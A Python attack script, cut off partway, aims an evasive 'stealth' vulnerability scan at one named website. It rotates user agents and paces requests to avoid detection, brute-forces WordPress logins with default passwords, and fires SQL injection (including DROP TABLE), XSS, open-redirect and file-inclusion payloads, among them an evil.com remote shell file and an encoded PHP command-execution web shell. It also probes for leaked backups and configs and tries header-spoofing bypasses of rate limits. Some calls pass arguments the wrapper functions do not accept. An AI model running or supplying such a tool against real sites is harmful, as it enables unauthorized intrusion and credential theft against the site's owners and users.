import requests, re
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import concurrent.futures
import time
import random
from datetime import datetime
import os

import json

# =============================
# STEALTH PROTECTION MODULES
# =============================

# 1. USER-AGENT ROTATION
user_agents = [
    # Chrome Desktop
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Firefox Desktop
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    # Safari Desktop
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    # Edge Desktop
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    # Mobile Chrome
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    # Mobile Safari
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    # Older versions for diversity
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0"
]

def get_random_user_agent():
    """Returns a random legitimate browser user agent"""
    return random.choice(user_agents)

def get_stealth_headers():
    """Returns headers that mimic a real browser"""
    return {
        'User-Agent': get_random_user_agent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Cache-Control': 'max-age=0'
    }

# 2. REQUEST TIMING & RATE LIMITING
class StealthRequestManager:
    def __init__(self):
        self.last_request_time = 0
        self.request_count = 0
        self.session = requests.Session()
        self.session.headers.update(get_stealth_headers())
    
    def human_delay(self, url=""):
        """Adds smart delays based on request type"""
        # Determine if this is a sensitive request that needs stealth
        sensitive_patterns = [
            "admin", "wp-", "login", "config", ".env", "backup", 
            "exploit", "injection", "redirect", "lfi", "rfi",
            "sql", "xss", "csrf", "jwt", "graphql"
        ]
        
        is_sensitive = any(pattern in url.lower() for pattern in sensitive_patterns)
        
        if is_sensitive:
            # Sensitive requests get 0.5-1.5 second delays
            delay = random.uniform(0.5, 1.5)
        else:
            # Basic enumeration gets minimal delays (0.1-0.3 seconds)
            delay = random.uniform(0.1, 0.3)
        
        # Add small burst protection for very rapid requests
        time_since_last = time.time() - self.last_request_time
        if time_since_last < 0.5:  # If requests are too fast
            delay += random.uniform(0.2, 0.5)
        
        time.sleep(delay)
        self.last_request_time = time.time()
        self.request_count += 1
    
    def stealth_get(self, url, timeout=10, allow_redirects=True):
        """Performs a stealth GET request with smart timing"""
        self.human_delay(url)
        
        # Rotate user agent for each request
        self.session.headers.update({'User-Agent': get_random_user_agent()})
        
        try:
            response = self.session.get(
                url, 
                timeout=timeout, 
                allow_redirects=allow_redirects,
                headers=get_stealth_headers()
            )
            return response
        except Exception as e:
            print(f"   [!] Request failed for {url}: {str(e)}")
            return None
    
    def stealth_post(self, url, data=None, json_data=None, timeout=10):
        """Performs a stealth POST request with smart timing"""
        self.human_delay(url)
        
        # Rotate user agent for each request
        self.session.headers.update({'User-Agent': get_random_user_agent()})
        
        try:
            response = self.session.post(
                url,
                data=data,
                json=json_data,
                timeout=timeout,
                headers=get_stealth_headers()
            )
            return response
        except Exception as e:
            print(f"   [!] POST request failed for {url}: {str(e)}")
            return None

# Initialize stealth request manager
stealth_manager = StealthRequestManager()

# =============================
# MAIN SCRIPT
# =============================

base_url = "http://wcesd2tx.us/"
domain = urlparse(base_url).netloc
scan_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
print("[*] Starting STEALTH enhanced deep scrape for:", base_url)
print("[*] Stealth mode: User-Agent rotation + Human-like timing enabled")

# Initialize report data
report_data = {
    "target": base_url,
    "domain": domain,
    "scan_timestamp": scan_timestamp,
    "scan_duration": 0,
    "vulnerabilities": {},
    "findings": {},
    "recommendations": [],
    "risk_level": "LOW"
}

# =============================
# 1. SUBDOMAIN ENUMERATION
# =============================
print("\n[+] Starting subdomain enumeration...")
subdomains = set()

# Common subdomain wordlist
subdomain_list = [
    "www", "api", "admin", "dev", "staging", "test", "beta", "app", "mobile",
    "secure", "portal", "dashboard", "cpanel", "webmail", "mail", "ftp", "ssh",
    "vpn", "remote", "internal", "private", "backup", "db", "database", "cdn",
    "static", "assets", "media", "files", "upload", "download", "support",
    "help", "docs", "wiki", "blog", "forum", "shop", "store", "payment",
    "billing", "invoice", "accounting", "hr", "jobs", "careers", "about",
    "contact", "sales", "marketing", "analytics", "stats", "monitoring"
]

def check_subdomain(subdomain):
    try:
        url = f"https://{subdomain}.{domain}"
        response = stealth_manager.stealth_get(url, timeout=5, allow_redirects=False)
        if response and response.status_code in [200, 301, 302, 403, 401]:
            return f"{subdomain}.{domain} ({response.status_code})"
    except:
        pass
    return None

# Use threading for faster enumeration (reduced workers for stealth)
with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
    futures = [executor.submit(check_subdomain, sub) for sub in subdomain_list]
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            subdomains.add(result)
            print(f"   [!] Found subdomain: {result}")

# =============================
# 2. JAVASCRIPT API ENDPOINT EXTRACTION
# =============================
print("\n[+] Extracting API endpoints from JavaScript files...")
api_endpoints = set()

def extract_apis_from_js(js_content):
    # API endpoint patterns
    patterns = [
        r'["\'](/api/[^"\']*)["\']',
        r'["\'](/v\d+/[^"\']*)["\']',
        r'["\'](/rest/[^"\']*)["\']',
        r'["\'](/graphql[^"\']*)["\']',
        r'["\'](/admin/[^"\']*)["\']',
        r'["\'](/dashboard/[^"\']*)["\']',
        r'["\'](/user/[^"\']*)["\']',
        r'["\'](/auth/[^"\']*)["\']',
        r'["\'](/login[^"\']*)["\']',
        r'["\'](/logout[^"\']*)["\']',
        r'fetch\(["\']([^"\']*)["\']',
        r'axios\.(?:get|post|put|delete)\(["\']([^"\']*)["\']',
        r'\.ajax\([^)]*url:\s*["\']([^"\']*)["\']',
        r'window\.location\.href\s*=\s*["\']([^"\']*)["\']',
        r'location\.href\s*=\s*["\']([^"\']*)["\']'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, js_content, re.IGNORECASE)
        for match in matches:
            if match.startswith('/') or match.startswith('http'):
                api_endpoints.add(match)

# Get main page and extract JS files
try:
    r = stealth_manager.stealth_get(base_url, timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    
    # Extract APIs from main page JS
    extract_apis_from_js(r.text)
    
    # Find and analyze JS files
    js_files = []
    for script in soup.find_all("script", src=True):
        js_url = urljoin(base_url, script['src'])
        js_files.append(js_url)
    
    # Also look for inline scripts
    for script in soup.find_all("script"):
        if script.string:
            extract_apis_from_js(script.string)
    
    # Analyze external JS files
    for js_url in js_files[:5]:  # Limit to first 5 to avoid noise
        try:
            js_response = stealth_manager.stealth_get(js_url, timeout=10)
            extract_apis_from_js(js_response.text)
            print(f"   [+] Analyzed JS file: {js_url}")
        except:
            pass
            
except Exception as e:
    print(f"[-] Error fetching main page: {e}")

# Display found API endpoints
if api_endpoints:
    print(f"   [!] Found {len(api_endpoints)} potential API endpoints:")
    for endpoint in sorted(api_endpoints):
        print(f"      - {endpoint}")
else:
    print("   No API endpoints found in JavaScript.")

# =============================
# 3. DIRECTORY BRUTEFORCING
# =============================
print("\n[+] Starting directory bruteforcing...")
found_directories = set()

# Enhanced directory wordlist
directory_list = [
    # Admin/Control panels
    "admin", "administrator", "admin-panel", "adminpanel", "admin_area", "admin-area",
    "admin1", "admin2", "admin-login", "admin_login", "adm", "moderator", "webadmin",
    "adminarea", "bb-admin", "adminLogin", "admin_area", "panel-administracion",
    "instadmin", "memberadmin", "administratorlogin", "adm", "admin/account.php",
    "admin/index.php", "admin/login.php", "admin/admin.php", "admin_area/admin.php",
    
    # Common files
    "robots.txt", "sitemap.xml", ".htaccess", ".htpasswd", "web.config", "crossdomain.xml",
    "clientaccesspolicy.xml", "favicon.ico", "apple-touch-icon.png", "humans.txt",
    
    # Backup files
    "backup", "backups", "bak", "old", "tmp", "temp", "cache", "log", "logs",
    "backup.zip", "backup.tar.gz", "backup.sql", "backup.php", "backup.txt",
    "backup.old", "backup.bak", "backup.swp", "backup.swo", "backup~",
    
    # Configuration files
    "config", "configuration", "conf", "settings", "setup", "install", "install.php",
    "config.php", "config.php.bak", "config.php.old", "config.php.swp",
    "configuration.php", "settings.php", "setup.php", "install.php",
    ".env", ".env.local", ".env.production", ".env.development",
    
    # Database files
    "db", "database", "sql", "mysql", "postgres", "mongo", "redis",
    "db.sql", "database.sql", "dump.sql", "backup.sql", "data.sql",
    
    # Development files
    "dev", "development", "test", "testing", "staging", "beta", "debug",
    "phpinfo.php", "info.php", "test.php", "debug.php", "dev.php",
    
    # CMS specific
    "wp-admin", "wp-content", "wp-includes", "wp-config.php", "wp-config.php.bak",
    "wp-config.php.old", "wp-config.php.swp", "wp-config.php.swo",
    "administrator", "administrator/index.php", "administrator/index.html",
    
    # API endpoints
    "api", "api/v1", "api/v2", "rest", "rest/api", "graphql", "swagger",
    "api/docs", "api/documentation", "api/swagger", "api/swagger.json",
    
    # Common directories
    "images", "img", "css", "js", "assets", "static", "media", "uploads",
    "downloads", "files", "documents", "docs", "documentation", "help",
    "support", "contact", "about", "team", "careers", "jobs", "blog",
    "news", "articles", "forum", "community", "user", "users", "member",
    "members", "account", "accounts", "profile", "profiles", "dashboard",
    "portal", "cpanel", "webmail", "mail", "email", "ftp", "ssh", "vpn"
]

def check_directory(path):
    try:
        url = urljoin(base_url, path)
        response = stealth_manager.stealth_get(url, timeout=5, allow_redirects=False)
        if response and response.status_code in [200, 301, 302, 403, 401]:
            return f"{path} ({response.status_code})"
    except:
        pass
    return None

# Use threading for faster bruteforcing
print("   [*] Bruteforcing directories (this may take a moment)...")
with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
    futures = [executor.submit(check_directory, path) for path in directory_list]
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found_directories.add(result)
            print(f"   [!] Found: {result}")

# =============================
# 4. WORDPRESS ENUMERATION
# =============================
print("\n[+] Starting WordPress enumeration...")
wp_findings = set()

# WordPress specific paths
wp_paths = [
    "wp-admin", "wp-login.php", "wp-config.php", "wp-config.php.bak",
    "wp-content", "wp-includes", "wp-json", "wp-json/wp/v2/users",
    "wp-json/wp/v2/posts", "wp-json/wp/v2/pages", "wp-json/wp/v2/comments",
    "wp-admin/admin-ajax.php", "wp-admin/admin-post.php", "wp-admin/load-scripts.php",
    "wp-admin/load-styles.php", "wp-admin/admin.php", "wp-admin/index.php",
    "wp-admin/options.php", "wp-admin/plugins.php", "wp-admin/themes.php",
    "wp-admin/users.php", "wp-admin/edit.php", "wp-admin/post.php",
    "wp-admin/edit-comments.php", "wp-admin/upload.php", "wp-admin/link-manager.php",
    "wp-admin/nav-menus.php", "wp-admin/widgets.php", "wp-admin/tools.php",
    "wp-admin/import.php", "wp-admin/export.php", "wp-admin/options-general.php",
    "wp-admin/options-writing.php", "wp-admin/options-reading.php",
    "wp-admin/options-discussion.php", "wp-admin/options-media.php",
    "wp-admin/options-permalink.php", "wp-admin/options-privacy.php",
    "wp-admin/update-core.php", "wp-admin/update.php", "wp-admin/network.php",
    "wp-admin/user-new.php", "wp-admin/user-edit.php", "wp-admin/profile.php",
    "wp-admin/plugin-install.php", "wp-admin/theme-install.php",
    "wp-admin/plugin-editor.php", "wp-admin/theme-editor.php",
    "wp-admin/customize.php", "wp-admin/site-health.php", "wp-admin/export-personal-data.php",
    "wp-admin/erase-personal-data.php", "wp-admin/options-head.php",
    "wp-admin/options-permalink.php", "wp-admin/options-writing.php",
    "wp-admin/options-reading.php", "wp-admin/options-discussion.php",
    "wp-admin/options-media.php", "wp-admin/options-permalink.php",
    "wp-admin/options-privacy.php", "wp-admin/update-core.php",
    "wp-admin/update.php", "wp-admin/network.php", "wp-admin/user-new.php",
    "wp-admin/user-edit.php", "wp-admin/profile.php", "wp-admin/plugin-install.php",
    "wp-admin/theme-install.php", "wp-admin/plugin-editor.php", "wp-admin/theme-editor.php",
    "wp-admin/customize.php", "wp-admin/site-health.php", "wp-admin/export-personal-data.php",
    "wp-admin/erase-personal-data.php", "wp-admin/options-head.php"
]

def check_wp_path(path):
    try:
        url = urljoin(base_url, path)
        response = stealth_manager.stealth_get(url, timeout=5, allow_redirects=False)
        if response and response.status_code in [200, 301, 302, 403, 401]:
            return f"{path} ({response.status_code})"
    except:
        pass
    return None

# Check WordPress paths
with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
    futures = [executor.submit(check_wp_path, path) for path in wp_paths]
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            wp_findings.add(result)
            print(f"   [!] WordPress path: {result}")

# =============================
# 5. ADMIN PANEL TESTING
# =============================
print("\n[+] Testing admin panel access...")
admin_findings = set()

# Common admin credentials
admin_creds = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("admin", "root"), ("admin", "administrator"),
    ("administrator", "admin"), ("administrator", "password"),
    ("root", "root"), ("root", "admin"), ("test", "test"),
    ("demo", "demo"), ("guest", "guest"), ("user", "user")
]

def test_admin_login(username, password):
    try:
        login_url = urljoin(base_url, "wp-login.php")
        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': urljoin(base_url, "wp-admin/"),
            'testcookie': '1'
        }
        response = stealth_manager.stealth_post(login_url, data=data, timeout=10)
        
        # Check for successful login indicators
        if response and response.status_code == 302 and "wordpress_logged_in" in response.headers.get('Set-Cookie', ''):
            return f"SUCCESS: {username}:{password}"
        elif response and response.status_code == 200 and "dashboard" in response.text.lower():
            return f"POSSIBLE: {username}:{password}"
    except:
        pass
    return None

# Test admin credentials
print("   [*] Testing common admin credentials...")
for username, password in admin_creds[:3]:  # Limit to first 3 for speed
    result = test_admin_login(username, password)
    if result:
        admin_findings.add(result)
        print(f"   [!] {result}")

# =============================
# 6. BACKUP FILE EXPLOITATION
# =============================
print("\n[+] Attempting backup file access...")
backup_findings = set()

# Backup file bypass techniques (reduced for speed)
backup_bypasses = [
    "backup.zip", "backup.tar.gz", "backup.sql", "backup.php", "backup.txt",
    "backup~", "backup.swp", "backup.1", "backup_old", "backup_2024"
]

def check_backup_file(file_path):
    try:
        url = urljoin(base_url, file_path)
        response = stealth_manager.stealth_get(url, timeout=5, allow_redirects=False)
        if response and response.status_code == 200 and len(response.text) > 50:
            return f"{file_path} ({response.status_code}) - {len(response.text)} bytes"
    except:
        pass
    return None

# Check backup files with bypass techniques (reduced workers for speed)
with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
    futures = [executor.submit(check_backup_file, file_path) for file_path in backup_bypasses]
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            backup_findings.add(result)
            print(f"   [!] Backup file accessible: {result}")

# =============================
# 7. INFORMATION DISCLOSURE
# =============================
print("\n[+] Checking for information disclosure...")
info_disclosure = set()

# Error triggering and info disclosure
error_paths = [
    "nonexistent.php", "test.php", "debug.php", "info.php", "phpinfo.php",
    "error.php", "error_log", "error.log", "debug.log", "access.log",
    "apache.log", "nginx.log", "server-status", "server-info",
    "status", "info", "debug", "test", "example", "sample",
    "readme.txt", "readme.md", "changelog.txt", "version.txt",
    "license.txt", "license.md", "contributing.md", "install.txt",
    "install.md", "setup.txt", "setup.md", "config.txt", "config.md"
]

def check_info_disclosure(path):
    try:
        url = urljoin(base_url, path)
        response = stealth_manager.stealth_get(url, timeout=5, allow_redirects=False)
        if response and response.status_code == 200:
            content = response.text.lower()
            # Check for sensitive information
            sensitive_info = []
            if "error" in content or "exception" in content:
                sensitive_info.append("Error messages")
            if "database" in content or "mysql" in content or "sql" in content:
                sensitive_info.append("Database info")
            if "version" in content or "php" in content or "apache" in content:
                sensitive_info.append("Version info")
            if "path" in content or "directory" in content:
                sensitive_info.append("Path disclosure")
            if "password" in content or "secret" in content or "key" in content:
                sensitive_info.append("Credentials")
            
            if sensitive_info:
                return f"{path} - {', '.join(sensitive_info)}"
    except:
        pass
    return None

# Check for information disclosure
with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
    futures = [executor.submit(check_info_disclosure, path) for path in error_paths]
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            info_disclosure.add(result)
            print(f"   [!] Info disclosure: {result}")

# =============================
# 8. SQL INJECTION TESTING
# =============================
print("\n[+] Testing for SQL injection vulnerabilities...")
sql_findings = set()

# SQL injection payloads
sql_payloads = [
    "'", "''", "`", "``", ",", "\\", "%27", "%60", "%5C",
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "admin'--", "admin'#", "admin'/*", "admin' OR '1'='1",
    "1' OR '1'='1", "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*",
    "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,3#", "' UNION SELECT 1,2,3/*",
    "'; DROP TABLE users--", "'; DROP TABLE users#", "'; DROP TABLE users/*"
]

def test_sql_injection(url, param, payload):
    try:
        test_url = f"{url}?{param}={payload}"
        response = stealth_manager.stealth_get(test_url, timeout=10)
        content = response.text.lower()
        
        # Check for SQL error indicators
        sql_errors = [
            "sql syntax", "mysql error", "oracle error", "postgresql error",
            "sql server error", "sqlite error", "database error", "mysql_fetch_array",
            "mysql_fetch_object", "mysql_num_rows", "mysql_result", "mysql_query",
            "mysql_connect", "mysql_select_db", "mysql_close", "mysql_error",
            "warning: mysql", "fatal error", "unclosed quotation mark",
            "quoted string not properly terminated", "unterminated string",
            "syntax error", "division by zero", "invalid syntax"
        ]
        
        for error in sql_errors:
            if error in content:
                return f"SQL Injection: {url}?{param}={payload[:20]}... - {error}"
    except:
        pass
    return None

# Test common parameters for SQL injection
common_params = ["id", "user", "username", "email", "search", "q", "query", "page", "category", "product"]
base_url_clean = base_url.rstrip('/')

for param in common_params[:5]:  # Limit to first 5 params for speed
    for payload in sql_payloads[:2]:  # Limit to first 2 payloads per param
        result = test_sql_injection(base_url_clean, param, payload)
        if result:
            sql_findings.add(result)
            print(f"   [!] {result}")

# =============================
# 9. XSS (CROSS-SITE SCRIPTING) TESTING
# =============================
print("\n[+] Testing for XSS vulnerabilities...")
xss_findings = set()

# XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "javascript:alert('XSS')",
    "javascript:alert(1)",
    "<script>prompt('XSS')</script>",
    "<script>confirm('XSS')</script>",
    "<script>eval('alert(1)')</script>",
    "<script>Function('alert(1)')()</script>",
    "<script>setTimeout('alert(1)',1000)</script>",
    "<script>setInterval('alert(1)',1000)</script>",
    "<script>new Function('alert(1)')()</script>"
]

def test_xss(url, param, payload):
    try:
        test_url = f"{url}?{param}={payload}"
        response = stealth_manager.stealth_get(test_url, timeout=10)
        content = response.text
        
        # Check if payload is reflected in response
        if payload in content:
            return f"XSS Reflected: {url}?{param}={payload[:20]}..."
    except:
        pass
    return None

# Test common parameters for XSS
for param in common_params[:5]:  # Limit to first 5 params for speed
    for payload in xss_payloads[:2]:  # Limit to first 2 payloads per param
        result = test_xss(base_url_clean, param, payload)
        if result:
            xss_findings.add(result)
            print(f"   [!] {result}")

# =============================
# 10. OPEN REDIRECT TESTING
# =============================
print("\n[+] Testing for open redirect vulnerabilities...")
redirect_findings = set()

# Open redirect payloads
redirect_payloads = [
    "https://evil.com",
    "//evil.com",
    "javascript:alert('redirect')",
    "data:text/html,<script>alert('redirect')</script>",
    "file:///etc/passwd",
    "ftp://evil.com",
    "http://evil.com",
    "https://google.com",
    "https://bing.com",
    "https://yahoo.com"
]

def test_open_redirect(url, param, payload):
    try:
        test_url = f"{url}?{param}={payload}"
        response = stealth_manager.stealth_get(test_url, timeout=10, allow_redirects=False)
        
        # Check for redirect response
        if response and response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get('Location', '')
            if payload in location or 'evil.com' in location:
                return f"Open Redirect: {url}?{param}={payload[:20]}... -> {location}"
    except:
        pass
    return None

# Test common redirect parameters
redirect_params = ["redirect", "url", "next", "target", "redir", "destination", "goto", "link", "continue", "return"]
for param in redirect_params[:5]:  # Limit to first 5 params for speed
    for payload in redirect_payloads[:2]:  # Limit to first 2 payloads per param
        result = test_open_redirect(base_url_clean, param, payload)
        if result:
            redirect_findings.add(result)
            print(f"   [!] {result}")

# =============================
# 11. LFI/RFI (LOCAL/REMOTE FILE INCLUSION) TESTING
# =============================
print("\n[+] Testing for LFI/RFI vulnerabilities...")
lfi_findings = set()

# LFI/RFI payloads
lfi_payloads = [
    "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "../../../windows/system32/drivers/etc/hosts",
    "../../../../windows/system32/drivers/etc/hosts",
    "../../../../../windows/system32/drivers/etc/hosts",
    "....//....//....//etc/passwd", "....//....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd", "..%252F..%252F..%252Fetc%252Fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
    "http://evil.com/shell.txt", "https://evil.com/shell.txt",
    "ftp://evil.com/shell.txt", "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
    "expect://id", "input://id", "phar://test.phar"
]

def test_lfi_rfi(url, param, payload):
    try:
        test_url = f"{url}?{param}={payload}"
        response = stealth_manager.stealth_get(test_url, timeout=10)
        content = response.text
        
        # Check for successful file inclusion
        lfi_indicators = [
            "root:x:0:0:", "daemon:x:1:1:", "bin:x:2:2:", "sys:x:3:3:",
            "adm:x:4:4:", "tty:x:5:0:", "disk:x:6:1:", "lp:x:7:7:",
            "mail:x:8:8:", "news:x:9:9:", "uucp:x:10:10:", "man:x:12:15:",
            "games:x:13:20:", "gopher:x:13:30:", "ftp:x:14:50:", "nobody:x:99:99:",
            "system", "administrator", "admin", "guest", "test", "user",
            "127.0.0.1", "localhost", "::1", "fe80::1", "::ffff:127.0.0.1"
        ]
        
        for indicator in lfi_indicators:
            if indicator in content:
                return f"LFI/RFI: {url}?{param}={payload[:20]}... - {indicator}"
    except:
        pass
    return None

# Test common file inclusion parameters
lfi_params = ["file", "page", "include", "path", "doc", "document", "folder", "root", "pg", "filename"]
for param in lfi_params[:5]:  # Limit to first 5 params for speed
    for payload in lfi_payloads[:2]:  # Limit to first 2 payloads per param
        result = test_lfi_rfi(base_url_clean, param, payload)
        if result:
            lfi_findings.add(result)
            print(f"   [!] {result}")

# =============================
# 12. JWT TOKEN ANALYSIS
# =============================
print("\n[+] Analyzing JWT tokens...")
jwt_findings = set()

def analyze_jwt_tokens(content):
    # JWT token pattern
    jwt_pattern = r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*'
    jwt_tokens = re.findall(jwt_pattern, content)
    
    for token in jwt_tokens:
        try:
            # Split JWT token
            parts = token.split('.')
            if len(parts) == 3:
                header = parts[0]
                payload = parts[1]
                signature = parts[2]
                
                # Decode header and payload (base64)
                import base64
                try:
                    header_decoded = base64.b64decode(header + '==').decode('utf-8')
                    payload_decoded = base64.b64decode(payload + '==').decode('utf-8')
                    
                    # Check for weak algorithms
                    if '"alg":"none"' in header_decoded or '"alg":"HS256"' in header_decoded:
                        jwt_findings.add(f"Weak JWT Algorithm: {token[:20]}...")
                    
                    # Check for sensitive data in payload
                    sensitive_data = ["password", "secret", "key", "admin", "role", "privilege"]
                    for data in sensitive_data:
                        if data in payload_decoded.lower():
                            jwt_findings.add(f"Sensitive JWT Data: {token[:20]}... - {data}")
                            
                except:
                    jwt_findings.add(f"JWT Token Found: {token[:20]}...")
        except:
            pass

# Analyze main page for JWT tokens
try:
    main_response = stealth_manager.stealth_get(base_url, timeout=10)
    analyze_jwt_tokens(main_response.text)
    if jwt_findings:
        for finding in jwt_findings:
            print(f"   [!] {finding}")
    else:
        print("   No JWT tokens found.")
except:
    print("   Error analyzing JWT tokens.")

# =============================
# 13. GRAPHQL INTROSPECTION
# =============================
print("\n[+] Testing GraphQL introspection...")
graphql_findings = set()

# GraphQL endpoints to test
graphql_endpoints = [
    "/graphql", "/graphiql", "/graphql/", "/api/graphql", "/api/graphiql",
    "/v1/graphql", "/v2/graphql", "/gql", "/query", "/api/query",
    "/graphql.php", "/graphql.js", "/graphql.json", "/graphql.xml"
]

# GraphQL introspection query
introspection_query = {
    "query": """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          locations
          args {
            ...InputValue
          }
        }
      }
    }
    fragment FullType on __Type {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }
    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }
    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
    """
}

def test_graphql_introspection(endpoint):
    try:
        url = urljoin(base_url, endpoint)
        
        # Test POST request
        response = stealth_manager.stealth_post(url, json=introspection_query, timeout=10, headers={
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        })
        
        if response and response.status_code == 200:
            content = response.text.lower()
            if "__schema" in content or "querytype" in content or "mutationtype" in content:
                return f"GraphQL Introspection Enabled: {endpoint}"
        
        # Test GET request
        response = stealth_manager.stealth_get(url, timeout=10)
        if response and response.status_code == 200:
            content = response.text.lower()
            if "graphql" in content or "graphiql" in content:
                return f"GraphQL Endpoint Found: {endpoint}"
                
    except:
        pass
    return None

# Test GraphQL endpoints
for endpoint in graphql_endpoints:
    result = test_graphql_introspection(endpoint)
    if result:
        graphql_findings.add(result)
        print(f"   [!] {result}")

# =============================
# 14. RATE LIMITING BYPASS
# =============================
print("\n[+] Testing rate limiting bypasses...")
rate_limit_findings = set()

# Rate limiting bypass techniques
bypass_headers = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Forwarded-For": "192.168.1.1"},
    {"X-Forwarded-For": "172.16.0.1"},
    {"X-Forwarded-For": "0.0.0.0"},
    {"X-Forwarded-For": "::1"},
    {"X-Forwarded-For": "fe80::1"},
    {"X-Forwarded-For": "::ffff:127.0.0.1"}
]

def test_rate_limit_bypass(url, headers):
    try:
        response = stealth_manager.stealth_get(url, headers=headers, timeout=10)
        if response and response.status_code == 200:
            return f"Rate Limit Bypass: {list(headers.keys())[0]} = {list(headers.values())[0]}"
    except:
        pass
    return None

# Test rate limiting bypasses on admin endpoint
admin_url = urljoin(base_url, "admin")
for headers in bypass_headers:
    result = test_rate_limit_bypass(admin_url, headers)
    if result:
        rate_limit_findings.add(result)
        print(f"   [!] {result}")

# =============================
# 15. CSRF (CROSS-SITE REQUEST FORGERY) TESTING
# =============================
